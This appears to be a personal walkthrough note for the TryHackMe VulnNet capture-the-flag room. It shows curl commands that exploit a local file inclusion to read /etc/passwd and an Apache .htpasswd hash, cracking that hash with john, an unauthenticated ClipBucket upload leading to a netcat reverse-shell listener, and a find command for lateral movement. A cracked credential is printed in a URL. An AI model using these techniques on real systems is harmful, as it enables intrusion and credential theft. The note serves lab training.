
2025-01-30 22:44

Source: #Boot2root

After adding the IP to `/etc/hosts`, we do some directory busting which leads us nowhere so we [[crawling a website]] to find links 

Checking the source code of the main page reveals 2 JavaScript imports at the end of the code
- The analysis of the first script will reveal the following subdomain - `http://broadcast.vulnnet.thm`
- The second script reveals that `index.php` accepts a `referer` parameter - `http://vulnnet.thm/index.php?referer=`
#### LFI 

Browsing this new subdomain prompts for a basic authentication, which is a dead end at this stage. Let’s check the other information.

Injecting `/etc/password` as `referer` confirms that the page suffers from a Local File Inclusion ([[LFI]])
```sh
curl -s http://vulnnet.thm/?referer=/etc/passwd
```

Let’s check in the Apache configuration files 
```sh
curl -s http://vulnnet.thm/?referer=/etc/apache2/sites-enabled/000-default.conf
```

from the above command we get to know that the password file is located in  `/etc/apache2/.htpasswd`
```
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```

the username is developers and the `md5crypt` hash is to the right
use john to crack the hash 
```sh
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
### Revshell

- on accessing the website `broadcast.vulnnet.thm` we see that it uses `clipbucket 4.0`
- This version has a exploit available on `searchsploit`, we can upload a file without authentication
Follow the instructions in the exploit and upload a php revshell 

Open a listener (`nc -nlvp 4444`) and browse the uploaded shell `http://developers:9972761drmfsls@broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1620367741f6065c.php`.
### Lateral movement

- Lateral movement from www-data > server-management
Checking the `/home` folder, as well as the `/etc/passwd` file will confirm the existence of a `server-management` user.

Let’s check what files are owned by this user [[Find]]
```
find / -type f -user server-management -exec ls -l {} + 2>/dev/null
```

this user owns a zip file in the `/var/backup` directory 




### References
[TryHackMe | VulnNet](https://tryhackme.com/r/room/vulnnet1)

walktrough
[TryHackMe-VulnNet - aldeid](https://www.aldeid.com/wiki/TryHackMe-VulnNet)
[VulnNet Tryhackme Writeup. By Shamsher khan This is a Writeup of… | by Shamsher khan | InfoSec Write-ups](https://infosecwriteups.com/vulnnet-tryhackme-writeup-3a5bd68b0959)
[TryHackMe — Vulnnet WriteUp/Walkthrough | by Arnav singh | Medium](https://medium.com/@arnavsinghinfosec/tryhackme-vulnnet-writeup-walkthrough-3b7846b24416)